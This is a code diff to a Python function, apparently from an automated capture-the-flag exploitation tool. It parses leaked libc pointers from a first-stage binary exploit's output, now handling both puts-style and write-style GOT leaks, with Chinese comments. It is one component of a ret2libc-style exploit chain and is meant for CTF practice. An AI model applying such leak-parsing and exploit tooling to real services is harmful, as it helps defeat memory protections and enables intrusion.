@@ -733,29 +733,44 @@ _REMOTE_LIBC_STATE: dict = {}
 
 
 def _parse_leaks(out: bytes, leak_name: str) -> Optional[dict]:
-    """从 stage1 输出解析 1~2 个泄漏值（puts 双泄时第二行是 printf@got）。
+    """从 stage1 输出解析 1~2 个泄漏值。
 
-    解析锚点：leak 输出紧跟在换行后（puts 行），按 6 字节小端回读。
+    两种形态：
+      puts 型——每个泄漏值独占一行（以 \\0 截断），按行 6 字节回读；
+      write 型——write(1, got, 8) 连续输出 16 字节（含 \\0），两段背靠背无分隔，
+      按「8 字节对滑窗 + 段内 6 字节有效位」提取。
     """
-    import struct
     vals: list[int] = []
+
+    def _push(v: int):
+        if 0x7F0000000000 <= v < 0x800000000000 and v % 0x1000 != 0:
+            vals.append(v)
+
     for line in out.split(b"\n"):
         if not (4 <= len(line) <= 8):
             continue
-        # puts 打印的指针以 \0 截断；6 字节是 amd64 常见长度
         for ln in (6, 5):
             if len(line) >= ln:
                 v = int.from_bytes(line[:ln].ljust(8, b"\x00"), "little")
-                if 0x7F0000000000 <= v < 0x800000000000 and v % 0x1000 != 0:
-                    vals.append(v)
-                    break
+                _push(v)
+                break
+    if not vals:
+        # write 型：找「8 字节对齐、两段连续 0x7f 开头高位」的滑动窗口
+        i = 0
+        while i + 8 <= len(out):
+            v = int.from_bytes(out[i:i + 6].ljust(8, b"\x00"), "little")
+            if 0x7F0000000000 <= v < 0x800000000000:
+                _push(v)
+                i += 8
+            else:
+                i += 1
     if not vals:
         return None
-    # 去重保序
     uniq = list(dict.fromkeys(vals))
     if len(uniq) == 1:
         return {leak_name: uniq[0]}
-    return {leak_name: uniq[0], "printf": uniq[1]}
+    # 第二个符号名由调用方策略决定（write 双泄时 got2=read/printf）
+    return {leak_name: uniq[0], "read": uniq[1]}
 
 
 def _resolve_remote_libc(ch: Challenge, f: Facts, out: bytes,
